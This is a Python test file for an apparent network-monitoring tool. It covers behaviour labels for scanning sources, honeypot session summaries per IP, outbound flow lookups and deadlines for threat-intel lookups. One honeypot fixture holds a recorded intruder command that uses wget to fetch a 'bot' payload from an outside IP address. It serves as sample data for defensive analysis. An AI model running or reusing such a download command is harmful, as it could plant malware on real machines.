# SPDX-License-Identifier: GPL-2.0-or-later
# Copyright (C) 2026 The LanPulse authors
"""The IP info box context: labelled behaviours, outbound flow lookup and per-IP honeypot activity."""
import os
import pathlib
import sys
import tempfile
import time
import types
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "tests"))

import flows  # noqa: E402
import honeyanalysis as ha  # noqa: E402
import ipcontext as ic  # noqa: E402
from test_honeyanalysis import FakeHp  # noqa: E402

# (label of the case, facts, expected label)
CASES = [
    ("tagged research scanner", {"count": 400, "ports": 30, "tag": "Shodan"}, "Research scanner"),
    ("greynoise benign", {"count": 20, "ports": 3, "gn_class": "benign"}, "Research scanner"),
    ("honeypot intruder", {"count": 9, "ports": 1, "pot_commands": 6}, "Interactive attacker (decoy only)"),
    ("got through to an open port", {"count": 4, "ports": 1, "reached": 2, "hits_on_open": 2}, "Reached a real service"),
    ("got through but port not open", {"count": 2, "ports": 1, "reached": 2, "hits_on_open": 0}, "One-off probe"),
    ("hammering one service", {"count": 40, "ports": 1, "targets": 1, "max_repeat": 40, "days": 1}, "Persistent"),
    ("returns day after day", {"count": 12, "ports": 2, "targets": 1, "max_repeat": 4, "days": 5}, "Persistent"),
    ("port sweep", {"count": 30, "ports": 25, "targets": 1, "max_repeat": 1, "days": 1}, "Mass scanning"),
    ("one port on many hosts", {"count": 8, "ports": 1, "targets": 6, "max_repeat": 1, "days": 1}, "Sweeping for one service"),
    ("single hit", {"count": 1, "ports": 1, "targets": 1, "max_repeat": 1, "days": 1}, "One-off probe"),
    ("middling activity", {"count": 12, "ports": 4, "targets": 2, "max_repeat": 3, "days": 2}, "No clear pattern"),
]


class Behaviour(unittest.TestCase):
    def test_labelled_sources(self):
        wrong = [f"{n}: want {w}, got {ic.classify_source(f)['label']}" for n, f, w in CASES if ic.classify_source(f)["label"] != w]
        self.assertEqual(wrong, [])

    def test_every_read_explains_itself_and_does_not_claim_proof(self):
        for _, f, _ in CASES:
            r = ic.classify_source(f)
            self.assertTrue(r["evidence"])
            self.assertIn("not proof", r["note"])

    def test_facts_count_ports_repeats_and_open_services(self):
        t = time.time()
        rows = [(t, 22, "tcp", "allowed", "192.168.1.5", "SSH", "", ""), (t, 22, "tcp", "blocked", "192.168.1.5", "SSH", "", ""),
                (t - 86400 * 2, 80, "tcp", "blocked", "192.168.1.6", "HTTP", "", "")]
        f = ic.facts_from_rows(rows, {"192.168.1.5": {"ports": [{"port": 22}]}})
        self.assertEqual((f["count"], f["ports"], f["targets"], f["max_repeat"], f["days"]), (3, 2, 2, 2, 2))
        self.assertEqual((f["reached"], f["hits_on_open"]), (1, 1))


class Stores(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.nm = types.SimpleNamespace(args=types.SimpleNamespace(demo=False), data_dir=pathlib.Path(self.tmp.name),
                                        notify_plain=lambda *a: None, devices={}, label=lambda d: d.get("name", d.get("ip")))
        self.h = ha.HoneyAnalysis(self.nm, FakeHp())

    def tearDown(self):
        self.h.db.close()
        self.tmp.cleanup()

    def test_ip_activity_reports_sessions_sequence_and_links(self):
        for sid, ip in (("a", "198.51.100.7"), ("b", "198.51.100.8")):
            self.h.add_session({"session": sid, "ip": ip, "port": 22, "proto": "ssh", "sensor": "pi", "hassh": "c" * 32,
                                "logins": [{"u": "root", "p": "x", "ok": True}],
                                "commands": ["uname -a", "wget http://45.9.148.77/bot"], "files": []})
        r = self.h.ip_activity("198.51.100.7")
        self.assertEqual(r["total"], 1)
        self.assertTrue(r["logged_in"])
        self.assertEqual(r["commands"], 2)
        self.assertTrue(r["sequence"])
        self.assertTrue(any(l["kind"] == "SSH client fingerprint" and "198.51.100.8" in l["others"] for l in r["campaigns"]))
        self.assertIsNone(self.h.ip_activity("203.0.113.9"))


class OutboundFlows(unittest.TestCase):
    def test_devices_that_connected_out_are_listed(self):
        import sqlite3
        import threading
        db = sqlite3.connect(":memory:", check_same_thread=False)
        nm = types.SimpleNamespace(args=types.SimpleNamespace(demo=False), threats=types.SimpleNamespace(db=db, lock=threading.Lock()),
                                   devices={"x": {"id": "x", "ip": "192.168.1.5", "name": "Camera"}},
                                   label=lambda dev: dev["name"])
        fl = flows.FlowStore(nm)
        m = int(time.time() // 60)
        db.executemany("INSERT INTO flows VALUES (?,?,?,?,?,?,?)", [
            (m, "192.168.1.5", "203.0.113.50", 443, "tcp", 2, 0),
            (m - 1, "192.168.1.5", "203.0.113.50", 8443, "tcp", 1, 1),
            (m, "192.168.1.9", "198.51.100.1", 80, "tcp", 5, 0)])
        r = fl.to_dest("203.0.113.50")
        self.assertEqual([x["name"] for x in r["devices"]], ["Camera"])
        self.assertEqual(r["devices"][0]["ports"], [443, 8443])
        self.assertEqual((r["total"], r["devices"][0]["blocked"]), (3, 1))
        self.assertEqual(fl.to_dest("192.0.2.1")["devices"], [])


class IntelSpeed(unittest.TestCase):
    """The outside lookups run side by side with a deadline, and the panel opens before they finish."""

    def setUp(self):
        try:
            import threats
        except Exception as e:                       # the dashboard's own dependencies may be missing here
            self.skipTest(f"threats module not importable: {e}")
        self.threats = threats
        self.tmp = tempfile.TemporaryDirectory()
        nm = types.SimpleNamespace(args=types.SimpleNamespace(demo=False), data_dir=pathlib.Path(self.tmp.name), devices={},
                                   label=lambda d: d.get("ip"), settings={"threats": {"ignore_noise": False}, "dns": {}},
                                   honeyan=None, flows=None, honeypot=None)
        self.tm = threats.ThreatMonitor(nm)
        self.tm.tor_loaded = time.time()
        self.tm.refresh_tor = lambda: None

    def tearDown(self):
        self.tm.db.close()
        self.tmp.cleanup()

    def test_slow_services_do_not_add_up(self):
        t = self.threats

        def slow(url, headers=None, timeout=8):
            time.sleep(1.0)
            return {}
        orig, orig_dns = t._get_json, t.socket.gethostbyaddr
        t._get_json, t.socket.gethostbyaddr = slow, lambda ip: (time.sleep(1.0), ("h", [], [ip]))[1]
        try:
            start = time.time()
            self.tm.intel("203.0.113.9")
            took = time.time() - start
        finally:
            t._get_json, t.socket.gethostbyaddr = orig, orig_dns
        self.assertLess(took, 3.0, f"lookups ran one after another ({took:.1f}s)")

    def test_a_hung_service_is_cut_off_and_not_cached_for_hours(self):
        t = self.threats
        t.INTEL_DEADLINE = 1
        orig = t._get_json
        t._get_json = lambda *a, **k: time.sleep(4) or {}
        try:
            start = time.time()
            info = self.tm.intel("203.0.113.10")
            took = time.time() - start
        finally:
            t._get_json = orig
            t.INTEL_DEADLINE = 9
        self.assertLess(took, 2.5)
        self.assertIn("took too long", info["errors"].values())
        self.assertLess(self.tm.intel_cache["203.0.113.10"][0] + 6 * 3600 - time.time(), 130)

    def test_investigate_does_not_wait_for_outside_lookups(self):
        t = self.threats
        orig = t._get_json
        t._get_json = lambda *a, **k: time.sleep(3) or {}
        try:
            start = time.time()
            d = self.tm.investigate("203.0.113.11")
            took = time.time() - start
        finally:
            t._get_json = orig
        self.assertLess(took, 1.0)
        self.assertTrue(d["intel_pending"])


if __name__ == "__main__":
    unittest.main()
